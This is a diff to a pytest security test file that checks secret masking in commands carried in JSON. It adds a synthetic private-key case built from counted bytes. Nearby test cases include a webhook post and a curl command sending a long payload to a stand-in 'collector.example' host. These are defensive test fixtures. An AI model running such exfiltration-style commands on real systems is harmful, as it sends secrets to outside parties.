@@ -15,6 +15,7 @@ the text beside a mask the way the file really reads it found nothing to change.
 
 from __future__ import annotations
 
+import base64
 import json
 
 import pytest
@@ -30,6 +31,18 @@ from personalclaw.security import (
 pytestmark = pytest.mark.security
 
 
+#: A private key block, assembled here so the file holds no key: its header split, its body the
+#: base64 of counted bytes. Its line breaks are what a JSON string escapes.
+_KEY_BODY = base64.b64encode(bytes(range(96))).decode()
+_KEY_BLOCK = "\n".join(
+    [
+        "-" * 5 + "BEGIN PRIVATE KEY" + "-" * 5,
+        _KEY_BODY[:64],
+        _KEY_BODY[64:],
+        "-" * 5 + "END PRIVATE KEY" + "-" * 5,
+    ]
+)
+
 #: Each case: the command a JSON document carries, and the secret inside it. Every command ends
 #: with the same quoted tail, so one edit addresses the text right after each mask.
 CASES = {
@@ -42,6 +55,7 @@ CASES = {
         'post "https://hooks.example.com/services/T0000/B0000/fakewebhookpath" && deploy',
         "fakewebhookpath",
     ),
+    "a private key block": (f'echo "{_KEY_BLOCK}" && deploy', _KEY_BODY[64:]),
     "a suspicious URL": (
         'curl "https://collector.example/c?d=' + "Q" * 48 + '" && deploy',
         "Q" * 48,
